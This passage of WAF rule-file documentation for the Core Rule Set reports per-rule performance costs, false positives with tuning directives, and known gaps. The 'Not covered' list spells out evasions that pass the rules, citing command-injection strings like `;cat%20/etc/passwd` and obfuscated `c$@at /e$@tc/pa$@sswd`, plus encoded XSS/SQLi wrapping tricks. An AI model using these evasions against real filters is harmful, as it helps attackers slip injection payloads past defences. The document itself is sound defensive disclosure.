rule 10941103 about 5,700 (0.08 %, inside the noise of the measure: without it 6,766,397, range 6,766,324 to 6,775,931) and the
cookie rule 10941104 about 10,400 (0.15 %: without it 6,761,680, range 6,761,585 to 6,761,812). When it read every argument, cookie
and header, rule 10941103 cost about 59,300 (0.87 %) whatever its expression, so a cheaper expression did not help; the split of
10941100 into an argument and header rule and a cookie rule costs 14,700 (0.22 %) more than one rule that read the cookies with
`base64DecodeExt` (6,762,215 in the first session). The junk tail, the line break alternative and the anchors of rule 10941100 cost
under 1,000 instructions together. Rule 10932235 (a copy of 932235 over the `User-Agent`) costs about 12,800 instructions (0.26 %, measured on the previous version). The
page-URL and `encoding` exclusions are lists of names; as patterns they cost the same (6,708,477 against 6,708,470 per request,
measured in the review of the previous version). Excluding `x-request-id` and `x-forwarded-proto`, which Envoy writes,
saves about 190,000 instructions (2.8 % of a request, 10 % of what the file costs). The retargeting lines alone (H1, its exclusions
and H2) add about 1,264,000 (+25.5 %) and the rest of the file about 625,000 (+12.6 %; the two parts do not add up exactly because
they interact, and that run's baseline is 4,960,500; measured on the previous version): every header is one more value for 49 CRS rules, and the engine checks each
header name against the rule's exceptions. Without the connector's headers the same file costs 4,473,546 and 5,668,029 (+1,194,483,
+26.7 %; the previous version of the file 5,683,531). Retargeting every rule of the six tags instead of the listed ones costs more (+39.2 % without them; measured on an earlier version of the file).
Dropping nine more rules from the list (930140, 931110, 932171, 932175, 932230, 932270, 932280, 932330 and 934150) would save another
210,000 instructions (3.2 %) and changes no verdict of the X2 matrix, but five of them (932175, 932270, 932280, 932330, 934150) are
the only rules that read shell `alias`, tilde, brace and history expansion and Ruby `Process.spawn` payloads in a custom header: 64 of
the 1,182 requests that carry the payloads of the CRS's own regression tests would pass without them, so all nine stay (measured on
the previous version; those rules did not change). Compiling the policy (the CRS and the baseline) takes 1,944,620,565 instructions
without the file and 2,041,948,266 with it (+5.0 %: the copy of 932235's 10 KB operator is about 80 million of them; the previous
version of the file took 2,036,730,208, +4.7 %). With a response (phases 3 and 4) the file adds 1,815,445 instructions to a request
that costs 5,820,161 without it (+31.2 %; the previous version of the file 7,671,860 in all). Wall time per request is too noisy on a shared host to report, so the counts are the figure of
record. Excluding more headers from H1 saves instructions at the price of detection there.

### False positives and known residue

* A Java stack trace, a class name pasted into a form (`sun.misc.Unsafe`, `class.protectionDomain`) or a base64 or hex field that
  carries documentation naming `powershell`, `cmd.exe` or `/bin/sh` is denied (rules 10944130, 10930120, 10930121).
* **Base64 or hex file content in a JSON field** (an avatar, a document, a mail attachment, a repository file) is ordinary
  traffic, and random bytes decode to something libinjection reads as an HTML tag more often the longer they are. Of 50 random
  files per size in `{"name":..., "content": <base64>}` at level 1 (the CRS alone: none below 256 KiB), the unchained version
  of rules 10941100 and 10941101 denied 1 at 512 bytes, 2 at 2 KiB, 5 at 4 KiB, 12 at 8 KiB, 24 at 16 KiB, 43 at 64 KiB and 50 at
  256 KiB (hex alike): 223 of 750 (a second draw: 206). The rules now decode only a value that is entirely base64 (8 to 256
  characters) or hex (8 to 512 characters): 0 of a fresh draw of 750 is denied beyond the CRS's own 1. A random value near the cap is
  still denied: 0.2 percent of 192 bytes of base64 (256 characters), 0.4 percent of 256 bytes of hex (512 characters), 0.1 percent at 96
  bytes of base64 and 0.2 percent at 128 bytes of hex, measured on 1,000 values per size (the caps of 512 and 1,024 characters, which the previous
  version had, gave 0.9 percent at 384 bytes of base64 and 512 bytes of hex). A hex session cookie such as `.ASPXAUTH` (96 to 224
  bytes) locks out about 0.2 to 0.4 percent of its sessions until it is reissued (measured at 128 and 256 bytes). **Base64 wrapped at 76 columns** (GNU `base64`,
  Python's `encodebytes`, Java's MIME encoder, PHP's `chunk_split`, .NET `InsertLineBreaks`) is counted in full, line breaks included,
  and the head is anchored (`\A`, `\z`): `@rx` is multi-line, so a head anchored with `^` and `$` read each line of such a value, the
  chain then decoded all of it, and 60 of 100 random wrapped files of 16 KiB were denied where the CRS alone denies 32. Now the counts
  are the CRS's own at every size (1, 10, 32 and 82 of 100 at 1, 4, 16 and 64 KiB; 100 PEM certificates: the CRS's own 6). The gate holds
  ten such files (16, 64 and 256 KiB, three of them wrapped; group `upload`), and the unit tests hold random files of 16, 64 and 256
  KiB in a query argument and in a JSON field, one line and wrapped. The earlier claim "36,000 random benign values: 0 blocks" is true for
  short tokens only (JWT segments, digests, session ids).
* **A session cookie of random base64** (rule 10941104; the hex rule 10941101 does the same for a hex one, see above): the `AWSALB`
  cookie of an AWS Application Load Balancer (and `AWSALBCORS` and the target-group variants) is 96 to 192 random bytes of base64, and
  libinjection reads the decoded bytes of 6 of 2,500 cookies (0.24 percent) as a tag. The user is locked out until the cookie
  expires. Measured on 2,500 cookies of each kind of the review's corpus (seed 77, 96 to 192 random bytes, level 1), requests
  denied with the round-4 file / the round-5 file / this one: Rails and Rack `data--iv--tag`, percent-encoded, 1 / 10 / 1 (the CRS
  alone: 1); PHP `setcookie`, percent-encoded, 0 / 3 / 0; ASP.NET Core `.AspNetCore.Session=CfDJ8<base64url>` 0 / 6 / 0; `AWSALB`
  6 / 6 / 6. Round 5 added the first three: rule 10941103 read the percent-encoded cookies and `base64DecodeExt` read a base64url
  one in full. Now rule 10941103 reads arguments only and cookies are decoded with `base64Decode`, which costs the X2 matrix
  no request (the cookie rule is a copy of 10941100 with the older decode). Tuning, after `Include @crs-hardening-conf`:
  `SecRuleUpdateTargetById 10941104 "!REQUEST_COOKIES:AWSALB"` (a unit test applies it); excluding every cookie from the base64 and
  hex rules (10941104 and 10941101) costs 14 requests of the X2 matrix.
* **An IPv6 host or a path with brackets in a page-URL header** other than `Referer` and `Origin` (rule 932130 reads `[::1]` and
  `/products/[slug]` as a shell glob): `HX-Current-URL: http://[::1]:5000/items`, `X-Original-URL: https://[2001:db8::10]:8443/app/`
  and the `x-matched-path: /products/[slug]` of Vercel. The CRS alone passes them. The file excludes `Referer` and `Origin` from
  932130, not the other page-URL headers (as in earlier versions). Tuning: `SecRuleUpdateTargetById 932130
  "!REQUEST_HEADERS:X-Original-URL"` (or the header's name).
* **Base64 of ordinary markup** up to 192 bytes in a JSON field (rule 10941100): an SVG icon (the 121-byte one of the gate), an HTML
  snippet with an inline `style` (`<p style="color:#333">`), and the `raw` message of the Gmail API `users.messages.send` when it holds an
  HTML part. The rule reads the decoded markup as libinjection reads any value, as the CRS does the same markup unencoded; the CRS
  alone passes the encoded one. Of the 10 encoded values of the review (three SVG icons of 121 to 299 bytes, three HTML snippets, two Gmail
  messages, two SAML messages), 6 are denied: the smallest icon, the snippets and the Gmail messages; the two larger icons and the SAML
  messages are over the cap. Tuning, after `Include @crs-hardening-conf`: `SecRuleUpdateTargetById 10941100
  "!ARGS:json.icon"` (`json.<field>` for a JSON field, the name for a form or query argument; a unit test applies it to each of the three).
* **A URL whose host is an IP address, in a header or a cookie** (rule 931100; the CRS alone reads the same URL in a query
  argument, `?next=http://10.0.0.1/` blocks): Knative `ce-source: https://10.96.0.1:443`, GitLab `X-Gitlab-Instance:
  http://192.168.10.20`, WebDAV `Destination: http://192.168.1.50:5005/dav/x`, and the cookies of an intranet site (a NextAuth
  `next-auth.callback-url` on `http://127.0.0.1:3000`, return-URL cookies). `Origin`, `Referer` and the ten page-URL headers
  are excluded by name; any other header that holds such a URL (an intranet `X-Callback-Url: http://10.0.0.5:8080/hook`,
  `X-Forwarded-Url`, `X-Webhook-Url`) is read and blocks. A cookie that holds such a URL locks the user out until it expires.
  Tuning, after `Include @crs-hardening-conf`: `SecRuleUpdateTargetById 931100 "!REQUEST_HEADERS:ce-source"` (or
  `!REQUEST_HEADERS:X-Callback-Url`) or `SecRuleUpdateTargetById 931100 "!REQUEST_COOKIES:next-auth.callback-url"` (a unit test
  applies each of the first and the last).
* **`X-Fields: {id,name}`**, the field mask of Flask-RESTX, reads as a brace expansion (rule 932280). Tuning:
  `SecRuleUpdateTargetById 932280 "!REQUEST_HEADERS:X-Fields"`.
* **The `User-Agent` `ansible-httpget`** (the default of Ansible's `uri` and `get_url` modules; rule 932260 reads `httpget` as a
  command; the CRS alone blocks it from level 2) and a `User-Agent` that ends in `; gzip)` (`Snapchat/12.70.0.35 (iPhone15,2;
  iOS 17.2; gzip)`: rules 932260 and 10932235). Taking the `User-Agent` from 932260 closes the first at a cost of 32 requests of
  the X2 matrix (the `ua` bypass goes from 60.0 to 60.3 percent), so it is not in the file: `SecRuleUpdateTargetById 932260
  "!REQUEST_HEADERS:User-Agent"` after the include. For the second, a rule before the CRS rules removes both for that client:
  `SecRule REQUEST_HEADERS:User-Agent "@rx ^Snapchat/" "id:1001,phase:1,pass,nolog,t:none,ctl:ruleRemoveTargetById=932260;REQUEST_HEADERS:User-Agent,ctl:ruleRemoveById=10932235"`
  (a unit test applies both).
* Rule 10932130 denies a value that holds a pair of backticks around word characters (or around nothing), or `$(` and `)` around
  them, between two word characters: a generated password such as ``4Y``maXQ"Jva_UKG`` or ``}/dv`iW'odQUkG`A``. Measured on 20,000
  form and JSON logins with a 16-character password at level 1 (CRS alone / with the file): 21 / 21 of 10,000 passwords drawn from
  the 8-symbol set `!@#$%^&*` (no backtick, no `(`), 204 / 224 of 10,000 drawn from all 32 punctuation characters; at 12, 20 and 32
  characters the file adds 0.20, 0.31 and 0.48 percent where the CRS alone blocks 1.5, 2.5 and 3.8 percent, and 0 for the 8-symbol
  set. The file adds at most 13 percent of what the CRS alone blocks of the same logins, so the pattern is kept as it is. It has no exclusion by field name: an attacker controls field names. It no longer matches an
  empty `$@` or `$*` between word characters (`gbEb$@9NyFCfvt0d`): a password manager draws them in 0.1 to 0.9 percent of its
  passwords, and the shape is one of many empty expansions that pass anyway (`c$9at`, `c${x}at`, `c$x`).
  Rule 10932238 denies `` `ls` `` or `` `id` `` in code spans at levels 3 and 4. Two code spans joined by one
  character in prose (``Use `ARGS_GET`:`x` ``, `` `db`.`t` ``) and a backtick used as an apostrophe (``don`t ... it`s``) pass.
* The ordinary groups of the gate (a sample, not all traffic) take no added block from the file at any level, and the gate was
  widened after each review round found a class it lacked: the page URL in `Referer`, JSON keys named `__type`, cookies that hold
  a URL, generated passwords, the client hints of old Chromium and Composer, the page URL in `HX-Current-URL` and in proxy headers,
  base64 file content in JSON and `Forwarded` with an IPv6 client. Traffic of a kind the gate lacks can still block.
* **Rules 10942100 and 10942101 are shipped disabled** (commented out in the file). They run `@detectSQLi` over the
  base64-decoded and hex-decoded value, and libinjection reads random bytes that hold `'#` or `"#` as SQL: 60 of 36,000 random
  JWT segments, digests, UUIDs and session tokens (0.15 to 0.18 percent per value, 18 to 21 of 12,000 per place) block, so a
  session cookie that decodes that way would block one user on every request. A base64 or hex wrapped SQL injection
  therefore passes (the gate records `w|sqli-*`); the rules block it once the `#` is removed. The plan asked for them enabled
  unless they block more than 2 of 20 benign encoded values; the 20 values pass, but the larger sample decided. A narrower rule
  (arguments only, behind a printable-ASCII check of the decoded value) needs a chain and waits for the multiphase chain items.
* Not covered:
  * GraphQL query depth and alias limits (they need a GraphQL-aware operator or body processor), a query in the `operations`
    field of a multipart request and one nested below a JSON key other than an array index.
  * A Java stream in base64 that a space or a line break splits inside the magic (a MIME or Apache Commons Codec decoder skips
    them).
  * A multipart file part: the engine does not read file content (`FILES_TMP_CONTENT` is unsupported), so a gadget JSON or a
    serialized-object upload passes the Java rules, as it passes the CRS. The filter refuses file parts with 413 (see [Request body
    access](#request-body-access)); an embedder of the `coraza` crate does not get that.
  * A command substitution inside a word that holds `.`, `-`, `;`, `$x` or a longer command (``;c`.`at``, ``;c`-`at``,
    ``;c`:;`at``, ``;c`$x`at``): the content would match prose. An empty `$@` or `$*` inside a word (`;c$@at /e$@tc/pa$@sswd`)
    is not matched either, because generated passwords hold it.
  * A command in a path segment (`/app/;cat%20/etc/passwd`) passes at level 1, with and without the file: the CRS reads the path
    through `REQUEST_FILENAME`, which matches no command rule at that level (a command in the query string blocks, and level 2
    blocks the segment). The file excludes `:path` from the retargeted rules, so it does not read the path either.
  * A command in `Referer` or in one of the ten other page-URL headers of the list for rules 930120, 932120, 932160 and 932235, and
    in `TE` or one of the seven copies of `Accept-Encoding` for rule 932260 (see [Referer and the page
    URL](#referer-and-the-page-url)). A header under any other name is read.
  * A wrapped XSS payload that is longer than 256 base64 characters (192 bytes; a line break counts as one) or 512 hex characters (256
    bytes), or that holds more than the chains accept of an otherwise base64 or hex value: a junk byte before the payload (`!PHN...`),
    a space or a tab anywhere in the value (`PHN... x`, `PHN4 gb2...`: Python `b64decode`, PHP `base64_decode` and Node skip it),
    more than 64 characters after a junk byte, a percent escape other than `%2B`, `%2F` and `%3D` (`%00`, or `%50` for `P`, which PHP,
    Rack and Express decode), a literal `+` in a percent-encoded value, a double-URL-encoded value, and hex with an odd number of
    digits (Node's `Buffer.from(s, 'hex')` drops the last digit, `hexDecode` fails on it). A payload followed by one junk byte
    (`PHN...==!`, `;x`, `#`, `.`) and one written in the URL-safe alphabet with an early `-` or `_` are read in an argument and a
    header (in a cookie only the first: see below); one that is percent-encoded (`%2B`, `%2F`, `%3D`) is read in an argument only.
  * A base64 payload in a **cookie** that is percent-encoded (`%2B`, `%2F`, `%3D`) or written in the URL-safe alphabet with an early
    `-` or `_`, and a percent-encoded one in a header. Rule 10941103 reads arguments only, because Rails, Rack and PHP percent-encode
    base64 session cookies, and rule 10941104 decodes cookies with `base64Decode`, which stops at the first `-` or `_`, because ASP.NET
    Core writes its session cookie in base64url (see the false positives). In the X2 matrix rule 10941103 catches 14 requests, all
    arguments encoded twice; read over cookies and headers too it catches none more, and rule 10941104 decodes the same requests as
    `base64DecodeExt` would.
  * A payload in `x-request-id` or `x-forwarded-proto` for the 49 retargeted rules when a client can choose them: Envoy writes both
    on an edge, but a sidecar or `preserve_external_request_id` keeps the client's value. The file's own deny rules still read them,
    and so do the CRS rules that already read every header.
  * A query that GraphQL introspection sends as a parameter name or a JSON key (`?{__schema{types{name}}}=1`): rule 10934900 reads
    the `query` argument only (108 of the 273,618 X2 requests).
  * A command string in a cookie that the cookie parser splits at `;` (`rce-semi-ls|cookie`).
  * A payload that a backend decodes with a layer no rule undoes (double URL encoding, `%u`, overlong UTF-8, full-width forms).
* The CRS rejects `application/graphql` bodies (rule 920420) unless `tx.allowed_request_content_type` lists them; rule 10934902
  makes the engine keep such a body in `REQUEST_BODY` so rule 10934901 can read it.
* `Include @crs-hardening-conf` before `Include crs/rules/*.conf` keeps the deny rules (Java, GraphQL, substitutions, wrapped
  payloads) and drops the header retargeting; the tests record both.
